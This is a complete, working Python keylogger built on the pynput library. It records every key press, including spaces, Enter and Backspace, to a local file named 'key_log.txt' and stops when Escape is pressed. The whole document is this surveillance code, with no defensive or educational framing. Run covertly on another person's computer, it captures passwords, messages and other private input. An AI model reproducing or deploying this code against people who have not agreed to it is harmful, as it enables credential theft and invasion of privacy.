
from pynput.keyboard import Key, Listener

# File where the keystrokes will be logged
log_file = "key_log.txt"

# Function to log each key press
def log_key(key):
    with open(log_file, "a") as f:
        # Handle special keys like Enter, Space, etc.
        if key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.backspace:
            f.write('<BACKSPACE>')
        else:
            # Strip quotes from the key string representation
            f.write(str(key).replace("'", ""))

# Function to stop the listener (optional, for control)
def stop_logging(key):
    if key == Key.esc:  # Stop on pressing the Escape key
        return False

# Start listening to keystrokes
with Listener(on_press=log_key, on_release=stop_logging) as listener:
    listener.join()
